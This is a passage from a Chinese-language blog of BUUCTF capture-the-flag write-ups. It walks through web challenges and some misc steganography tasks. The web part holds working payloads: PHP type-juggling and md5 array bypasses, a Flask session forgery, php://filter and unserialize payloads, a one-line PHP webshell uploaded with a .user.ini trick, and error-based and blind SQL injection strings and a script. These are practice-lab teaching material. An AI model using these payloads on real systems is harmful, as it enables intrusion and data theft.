title="知识点"></a>知识点</h2><ul><li>备份文件泄露</li><li>php中的弱类型比较</li></ul><h2 id="过程-18"><a href="#过程-18" class="headerlink" title="过程"></a>过程</h2><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210717203200.png"></p><p>使用扫描软件扫一下目录，扫到/index.php.bak</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpinclude_once "flag.php";if(isset($_GET['key'])) {    $key = $_GET['key'];    if(!is_numeric($key)) {        exit("Just num!");    }    $key = intval($key);    $str = "123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3";    if($key == $str) {        echo $flag;    }}else {    echo "Try to find out source file!";}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这边拿到源码，能拿到flag需要满足下面的条件</p><ul><li>需要传入一个get型参数key</li><li>key的值必须是数字</li><li>双等于 弱比较</li></ul><p>所以直接传入123就可以了</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210717205906.png"></p><h1 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h1><h2 id="知识点-19"><a href="#知识点-19" class="headerlink" title="知识点"></a>知识点</h2><ul><li>flask session伪造</li></ul><h2 id="过程-19"><a href="#过程-19" class="headerlink" title="过程"></a>过程</h2><p>主页，有注册点和登陆点：</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210718093410.png"></p><p>登陆点，测试了一下，没有发现sql注入，然后我们随便注册一个账户123 123，登陆看看</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210718094018.png"></p><p>登陆成功之后，有个提示，说明得使用admin账户登陆之后才能得到flag</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210718094535.png"></p><p>changepassword，这里发现源码</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210718094434.png"></p><pre class="line-numbers language-none"><code class="language-none">@app.route('/code')def get_code():@app.route('/index')def index():@app.route('/register', methods = ['GET', 'POST'])def register():@app.route('/login', methods = ['GET', 'POST'])def login():@app.route('/logout')def logout():@app.route('/change', methods = ['GET', 'POST'])def change():@app.route('/edit', methods = ['GET', 'POST'])def edit():<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>有这么以上几个功能。</p><blockquote><p>flask session伪造</p></blockquote><p>原理：flask中session是存储在客户端cookie中的，也就是存储在本地。flask仅仅对数据进行了签名。众所周知的是，签名的作用是防篡改，而无法防止被读取。而flask并没有提供加密操作，所以其session的全部内容都是可以在客户端读取的，这就可能造成一些安全问题。</p><p>用脚本将session解密</p><pre class="line-numbers language-none"><code class="language-none">#!/usr/bin/env python3import sysimport zlibfrom base64 import b64decodefrom flask.sessions import session_json_serializerfrom itsdangerous import base64_decodedef decryption(payload):    payload, sig = payload.rsplit(b'.', 1)    payload, timestamp = payload.rsplit(b'.', 1)    decompress = False    if payload.startswith(b'.'):        payload = payload[1:]        decompress = True    try:        payload = base64_decode(payload)    except Exception as e:        raise Exception('Could not base64 decode the payload because of '                         'an exception')    if decompress:        try:            payload = zlib.decompress(payload)        except Exception as e:            raise Exception('Could not zlib decompress the payload before '                             'decoding the payload')    return session_json_serializer.loads(payload)if __name__ == '__main__':    print(decryption(sys.argv[1].encode()))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210718095634.png"></p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210718095809.png"></p><p>这里伪造session还需要知道SECRET_KEY，我们在config.py中发现里SECRET_KEY</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210718100442.png"></p><p>index.html文件：</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210718100524.png"></p><p>发现只要session[‘name’] == ‘admin’，就能得到flag</p><p>然后贴出一个flask session加密的脚本 <a href="https://github.com/noraj/flask-session-cookie-manager">https://github.com/noraj/flask-session-cookie-manager</a><br>利用刚刚得到的SECRET_KEY，在将解密出来的name改为admin，最后用脚本生成我们想要的session</p><pre class="line-numbers language-none"><code class="language-none">{'_fresh': True, '_id': b'33acffdbb8da98c01ab3379ec972f38ced401262f499f628df3eb2a4d06b135ce39867685db5b7525c69ea0e5bc5027c17bf9f7ee1af9721445ac5db6856faf0', 'csrf_token': b'0748bf465b7e203bb622dc868a10a6f8580bf62f', 'image': b'mLzK', 'name': '123', 'user_id': '10'}用脚本的时候记得到把123 改成 admin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210718101416.png"></p><p>把得到的session在浏览器中替换即可</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210718101549.png"></p><h1 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h1><h2 id="知识点-20"><a href="#知识点-20" class="headerlink" title="知识点"></a>知识点</h2><ul><li>strcmp函数绕过特性</li><li>cookie中修改标识用户身份的字段</li></ul><h2 id="过程-20"><a href="#过程-20" class="headerlink" title="过程"></a>过程</h2><p>主页，没发现可用信息</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210723100513.png"></p><p>右上角菜单，发现一个页面</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210723100440.png"></p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210723100554.png"></p><p>满足条件</p><ul><li>使用正确的金额购买flag</li><li>必须是CUIT的学生（请求头中可能存在表示用户身份的东西）</li><li>输入正确的密码</li></ul><blockquote><p>购买flag以及post  password</p></blockquote><pre class="line-numbers language-none"><code class="language-none">&lt;!--~~~post money and password~~~if (isset($_POST['password'])) {$password = $_POST['password'];if (is_numeric($password)) {echo "password can't be number&lt;/br&gt;";}elseif ($password == 404) {echo "Password Right!&lt;/br&gt;";}}--&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>需要满足的条件</p><ul><li>传入post型参数password</li><li>password不能是纯数字</li><li>password要等于404（这里的等于是弱类型比较，可以传入404a）</li></ul><p>传入</p><pre class="line-numbers language-none"><code class="language-none">money=100000000&amp;password=404a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>修改用户身份</p></blockquote><p>先抓包</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210723101923.png"></p><p>cookie中的参数修改为1</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210723102510.png"></p><p>这里就参考大佬，可以使用strcmp和科学计数法绕过</p><blockquote><p>#strcmp</p></blockquote><p>解释参考：<a href="https://blog.csdn.net/cherrie007/article/details/77473817">https://blog.csdn.net/cherrie007/article/details/77473817</a></p><pre class="line-numbers language-none"><code class="language-none">money[]=1&amp;password=404a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210723102730.png"></p><blockquote><p>#科学计数法</p></blockquote><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210723102843.png"></p><h1 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h1><h2 id="知识点-21"><a href="#知识点-21" class="headerlink" title="知识点"></a>知识点</h2><ul><li>md5 bypass（数组返回false）</li></ul><h2 id="过程-21"><a href="#过程-21" class="headerlink" title="过程"></a>过程</h2><p>主页，是这么个框框</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210723145213.png"></p><p>抓包发现提示</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210723145452.png"></p><pre class="line-numbers language-none"><code class="language-none">select * from 'admin' where password=md5($pass,true)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>16 位 md5 常见套路，输入密码 <code>ffifdyop</code>，登录即可。这是因为它的原始字符串导致了<code>' or 1=1</code> 的 SQL 注入，相当于所谓的万能密码登录。请参考：</p><blockquote><p><a href="https://www.jianshu.com/p/12125291f50d">https://www.jianshu.com/p/12125291f50d</a></p><p><a href="http://mslc.ctf.su/wp/leet-more-2010-oh-those-admins-writeup/">http://mslc.ctf.su/wp/leet-more-2010-oh-those-admins-writeup/</a></p></blockquote><p>登录后，查看网页源代码，发现代码，要求 a 和 b 不等但是 md5 相等：</p><pre class="line-numbers language-none"><code class="language-none">$a = $GET['a'];$b = $_GET['b'];if($a != $b &amp;&amp; md5($a) == md5($b)){//wow,you can really dance}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>又是典型的 md5 bypass，因为 <code>md5()</code> 或者 <code>sha1()</code> 之类的函数计算的是一个字符串的哈希值，对于数组则返回 false，如果 <code>$a</code> 和 <code>$b</code> 都是数组则双双返回 FALSE, 两个 FALSE 相等得以绕过。payload:</p><pre class="line-numbers language-none"><code class="language-none">/levels91.php?a[]=1&amp;b[]=2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210723150159.png"></p><p>得到代码</p><pre class="line-numbers language-none"><code class="language-none"> &lt;?phperror_reporting(0);include "flag.php";highlight_file(__FILE__);if($_POST['param1']!==$_POST['param2']&amp;&amp;md5($_POST['param1'])===md5($_POST['param2'])){    echo $flag;} <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">param1[]=1&amp;param2[]=2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210723150558.png"></p><p>一些md5值</p><p>0e开头的md5和原值：<br>QNKCDZO<br>0e830400451993494058024219903391<br>s878926199a<br>0e545993274517709034328855841020<br>s155964671a<br>0e342768416822451524974117254469<br>s214587387a<br>0e848240448830537924465865611904<br>s214587387a<br>0e848240448830537924465865611904<br>s878926199a<br>0e545993274517709034328855841020<br>s1091221200a<br>0e940624217856561557816327384675<br>s1885207154a</p><h1 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h1><h2 id="知识点-22"><a href="#知识点-22" class="headerlink" title="知识点"></a>知识点</h2><ul><li>data伪协议放置内容（ php5.2.0后），通常用来执行php代码</li><li>file协议读取文件</li><li>构造序列化内容</li></ul><h2 id="过程-22"><a href="#过程-22" class="headerlink" title="过程"></a>过程</h2><p>主页就是源代码</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php  $text = $_GET["text"];$file = $_GET["file"];$password = $_GET["password"];if(isset($text)&amp;&amp;(file_get_contents($text,'r')==="welcome to the zjctf")){    echo "&lt;br&gt;&lt;h1&gt;".file_get_contents($text,'r')."&lt;/h1&gt;&lt;/br&gt;";    if(preg_match("/flag/",$file)){        echo "Not now!";        exit();     }else{        include($file);  //useless.php        $password = unserialize($password);        echo $password;    }}else{    highlight_file(__FILE__);}?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>第一个<code>if</code></p></blockquote><pre class="line-numbers language-none"><code class="language-none">if(isset($text)&amp;&amp;(file_get_contents($text,'r')==="welcome to the zjctf"))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>传入一个get型参数text</li><li>text的内容是要得是 <code>welcome to the zjctf</code></li></ul><p>我们使用data伪协议（通常用来执行php代码），我们也可以将内容写入data协议中，让<code>file_get_contents</code>函数取读取。</p><p>使用base64加密一气呵成</p><pre class="line-numbers language-none"><code class="language-none">text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=#附上没有加密的text=data://text/plain,welcome to the zjctf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>第二个<code>if</code></p></blockquote><pre class="line-numbers language-none"><code class="language-none">if(preg_match("/flag/",$file))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>看以看到不能直接读取flag</p><p>采用filter来读源码，结合base64编码</p><pre class="line-numbers language-none"><code class="language-none">file=php://filter/read=convert.base64-encode/resource=useless.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>第三个要构造序列化内容</p></blockquote><pre class="line-numbers language-none"><code class="language-none">$password = $_GET["password"];include($file);  //useless.php$password = unserialize($password);echo $password;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>先查看useless.php源码</p><pre class="line-numbers language-none"><code class="language-none">?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php://filter/read=convert.base64-encode/resource=useless.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到一串base64串，解密得到源码</p><p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-X2938dVp-1627112883193)(C:/Users/Polaris/AppData/Roaming/Typora/typora-user-images/image-20210724153901393.png)]</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php  class Flag{  //flag.php      public $file;      public function __tostring(){          if(isset($this-&gt;file)){              echo file_get_contents($this-&gt;file);             echo "&lt;br&gt;";        return ("U R SO CLOSE !///COME ON PLZ");        }      }  }  ?&gt;  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>构造序列化内容</p><pre class="line-numbers language-none"><code class="language-none">O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>payload:</p><pre class="line-numbers language-none"><code class="language-none">?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210724154127.png"></p><h1 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h1><h2 id="知识点-23"><a href="#知识点-23" class="headerlink" title="知识点"></a>知识点</h2><ul><li><p>图片马制作 copy 01.jpg/a + 02.php/b test.jpg</p></li><li><p>.user.ini的上传 GIF89a（如果需要的话） auto_prepend_file=test.jpg</p></li></ul><h2 id="过程-23"><a href="#过程-23" class="headerlink" title="过程"></a>过程</h2><p>主页是一个上传页面</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210725101158.png"></p><p>上传<code>.php</code>，提示非法后缀</p><p>尝试将.php后缀改成.jpg，提示过滤了<code>&lt;?</code></p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210725102113.png"></p><p>正常上传图片，上传成功</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210725101841.png"></p><p>修改请求体中的一句话木马内容为</p><pre class="line-numbers language-none"><code class="language-none">&lt;script language="php"&gt;eval($_GET['cmd']);&lt;/script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上传后，页面返回提示</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210725102518.png"></p><p>搜罗资料</p><blockquote><p>exif_imagetype<br>(PHP 4 &gt;= 4.3.0, PHP 5, PHP 7, PHP 8)</p><p>exif_imagetype — 判断一个图像的类型</p><p>说明<br>exif_imagetype ( string $filename ) : int</p><p>exif_imagetype() 读取一个图像的第一个字节并检查其签名。</p></blockquote><p>这个函数就是检查文件头，直接制作图片马</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210725110330.png"></p><p>成功上传，但是此时还无法执行PHP脚本，接着我们可以上传一个<code>user.ini</code>的文件（经过测试，没有过滤该后缀），我们可以借助.user.ini轻松让所有php文件都“自动”包含某个文件，而这个文件可以是一个正常php文件，也可以是一个包含一句话的webshell,关于该文件详见：<a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html</a></p><p>然后我们去上传，文件名为<code>.user.ini</code></p><pre class="line-numbers language-none"><code class="language-none">GIF89aauto_prepend_file=test.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>蚁剑连接即可</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210725110609.png"></p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210725110656.png"></p><h1 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h1><h2 id="知识点-24"><a href="#知识点-24" class="headerlink" title="知识点"></a>知识点</h2><ul><li>绕过一些简单的过滤</li><li>right()</li></ul><h2 id="过程-24"><a href="#过程-24" class="headerlink" title="过程"></a>过程</h2><p>主页是一个登陆页面</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210809172300.png"></p><p>过滤了关键字 and、=、空格、union等</p><blockquote><p>查库</p></blockquote><pre class="line-numbers language-none"><code class="language-none">check.php?username=admin'or(updatexml(1,concat(0x7e,version(),0x7e),1))%23&amp;password=21<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210809172536.png"></p><blockquote><p>查表</p></blockquote><pre class="line-numbers language-none"><code class="language-none">check.php?username=admin'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))%23&amp;password=21<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210809172714.png"></p><blockquote><p>查字段</p></blockquote><pre class="line-numbers language-none"><code class="language-none">check.php?username=admin'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')),0x7e),1))%23&amp;password=21<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210809172752.png"></p><blockquote><p>dump数据</p></blockquote><pre class="line-numbers language-none"><code class="language-none">check.php?username=admin'or(updatexml(1,concat(0x7e,(select(group_concat(username,'~',password))from(H4rDsq1)),0x7e),1))%23&amp;password=21<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210809172820.png"></p><p>不是最终结果，上网搜罗，用right()语句</p><pre class="line-numbers language-none"><code class="language-none">check.php?username=admin'or(updatexml(1,concat(0x7e,(select(group_concat((right(password,25))))from(H4rDsq1)),0x7e),1))%23&amp;password=21<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210809173123.png"></p><p>拼接两段即得flag</p><p>flag{f1b0debe-86a4-4b3b-a1f0-bf67f3c734d9}</p><h1 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h1><h2 id="知识点-25"><a href="#知识点-25" class="headerlink" title="知识点"></a>知识点</h2><ul><li>fuzz</li><li>python盲注脚本</li></ul><h2 id="过程-25"><a href="#过程-25" class="headerlink" title="过程"></a>过程</h2><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210810154849.png"></p><p>fuzz一哈</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/1937992-20200911094122880-1747349205.png"></p><p>一个搜索框，搜索框输入1或2会返回结果，其他都返回bool(false)。过滤了union、and、or、空格等</p><p>贴上脚本：</p><pre class="line-numbers language-none"><code class="language-none">import requestsurl = "http://a5a19ec2-3fe1-4f07-9465-f4c861d25093.node4.buuoj.cn:81/index.php"result = ""num = 0  # 用了来判断是不是flag已经拼完整了for i in range(1, 60):    if num == 1:        break    for j in range(32, 128):        payload = "if(ascii(substr((select(flag)from(flag)),%d,1))=%d,1,2)" % (i, j)        # print(str((i-1)*96+j-32)+":~"+payload+"~")        data = {            "id": payload,        }        r = requests.post(url, data=data)        r.encoding = r.apparent_encoding        if "Hello" in r.text:            x = chr(j)            result += str(x)            print(result)            break        if "}" in result:            print(result)            num = 1            break<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buuctf </tag>
            
            <tag> wp </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf-misc-wp</title>
      <link href="2021/06/20/buuctf-misc-wp/"/>
      <url>2021/06/20/buuctf-misc-wp/</url>
      
        <content type="html"><![CDATA[<h1 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h1><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210620092922.png"></p><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ul><li>无</li></ul><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>点开即得到flag</p><h1 id="金三胖"><a href="#金三胖" class="headerlink" title="金三胖"></a>金三胖</h1><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210620092941.png"></p><h2 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h2><ul><li>利用工具stegsolve的Frame Browser可以查看gif图片的每一帧</li></ul><h2 id="过程-1"><a href="#过程-1" class="headerlink" title="过程"></a>过程</h2><p>下载附件得到，aaa.gif</p><p>下载工具stegsolve</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210616155159.png"></p><p>使用工具的FrameBrowser可以查看gif的每一帧</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210616155327.png"></p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210616155345.png"></p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210616155402.png"></p><p>flag{he11ohongke}</p><h1 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h1><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210620092950.png"></p><h2 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h2><ul><li>binwalk分离并提取文件</li><li>ziperello破解四位纯数字密码</li></ul><h2 id="过程-2"><a href="#过程-2" class="headerlink" title="过程"></a>过程</h2><p>打开附件是一个二维码图片QR_code.png，用软件扫描之后没有得到flag，先用binwalk分析并提取</p><pre class="line-numbers language-none"><code class="language-none">binwalk -e QR_code.png<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后进入提取后得到的目录</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210616162035.png"></p><p><img src="C:/Users/Polaris/AppData/Roaming/Typora/typora-user-images/image-20210616162111427.png" alt="image-20210616162111427"></p><p>尝试使用工具Ziperello来爆破1D7.zip</p><p>爆破成功，密码7639</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210616162142.png"></p><p>解压文件打开4number.txt得到flag</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210616162322.png"></p><h1 id="N种方法解决"><a href="#N种方法解决" class="headerlink" title="N种方法解决"></a>N种方法解决</h1><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210620092957.png"></p><h2 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h2><ul><li>使用普通编辑器打开文件，查看隐藏内容</li><li>利用html的img标签还原解码后的内容</li></ul><h2 id="过程-3"><a href="#过程-3" class="headerlink" title="过程"></a>过程</h2><p>下载附件是一个KEY.exe文件，无法打开，尝试使用notepad++打开，发现一大串字符</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210616163041.png"></p><p>从这个位置开始，复制到网站上解码<a href="https://the-x.cn/base64/">https://the-x.cn/base64/</a></p><p>发现是一个png的图片</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210616163136.png"></p><p>然后我们发现他是个png的文件，得想办法还原成png文件</p><p>写个html的文件，里面加入img标签，将img标签中的src属性改为刚刚得到的整个字符内容</p><pre class="line-numbers language-none"><code class="language-none">&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt;    &lt;img src="替换内容"&gt;    &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后得到一个二维码</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210616163639.png"></p><p>扫描得到flag{dca57f966e4e4e31fd5b15417da63269}</p><h1 id="你竟然赶我走"><a href="#你竟然赶我走" class="headerlink" title="你竟然赶我走"></a>你竟然赶我走</h1><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210620093004.png"></p><h2 id="知识点-4"><a href="#知识点-4" class="headerlink" title="知识点"></a>知识点</h2><ul><li>使用普通编辑器，并在其中搜索字符串</li></ul><h2 id="过程-4"><a href="#过程-4" class="headerlink" title="过程"></a>过程</h2><p>下载后是biubiu.jpg，直接notepad++打开后搜索flag即可得到flag</p><p>flag{stego_is_s0_bor1ing}</p><h1 id="大白"><a href="#大白" class="headerlink" title="大白"></a>大白</h1><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210620093014.png"></p><h2 id="知识点-5"><a href="#知识点-5" class="headerlink" title="知识点"></a>知识点</h2><ul><li><p>由图片缺失联想到图片修改图片的二进制内容</p></li><li><p>利用HxD二进制查看工具修改对应图片的长或者宽度</p></li></ul><h2 id="过程-5"><a href="#过程-5" class="headerlink" title="过程"></a>过程</h2><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210616171528.png"></p><p>打开图片发现，下半部分被截掉了，得想办法恢复，打开Hxd</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210616173229.png"></p><p>修改下长度，保存查看即可查看flag</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210616173317.png"></p><p>flag{He1l0_d4_ba1}</p><h1 id="基础破解"><a href="#基础破解" class="headerlink" title="基础破解"></a>基础破解</h1><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210620093020.png"></p><h2 id="知识点-6"><a href="#知识点-6" class="headerlink" title="知识点"></a>知识点</h2><ul><li>.rar文件被加密，使用archpr破解密码</li></ul><h2 id="过程-6"><a href="#过程-6" class="headerlink" title="过程"></a>过程</h2><p>打开附件然后解压之后得到一个.rar文件，这里使用一个工具叫archpr，然后题目提示密码长度为4为数字</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210617175158.png"></p><p>打开压缩包，</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210617175606.png"></p><p>发现一个base64的密码，解码得到flag</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210617175726.png"></p><h1 id="乌镇峰会种图"><a href="#乌镇峰会种图" class="headerlink" title="乌镇峰会种图"></a>乌镇峰会种图</h1><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210620093028.png"></p><h2 id="知识点-7"><a href="#知识点-7" class="headerlink" title="知识点"></a>知识点</h2><ul><li>普通编辑器打开文件，并搜索字符串</li></ul><h2 id="过程-7"><a href="#过程-7" class="headerlink" title="过程"></a>过程</h2><p>notepad++打开图片，搜索得到flag</p><h1 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h1><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210620093147.png"></p><h2 id="知识点-8"><a href="#知识点-8" class="headerlink" title="知识点"></a>知识点</h2><ul><li>使用stegsolve分析图片通道</li><li><a href="https://segmentfault.com/a/1190000016223897">LSB隐写</a></li></ul><h2 id="过程-8"><a href="#过程-8" class="headerlink" title="过程"></a>过程</h2><p>打开文件是一张图片，binwalk没有得到什么信息，然后放到stegsolve，分析通道，发现Red plane 0<code>、</code>Grenn plane 0<code>、</code>Blue plane0上方有东西</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210617182804.png"></p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210617182834.png"></p><p>然后保存名称为flag.png</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210617182910.png"></p><p>得到一个二维码</p><p><img 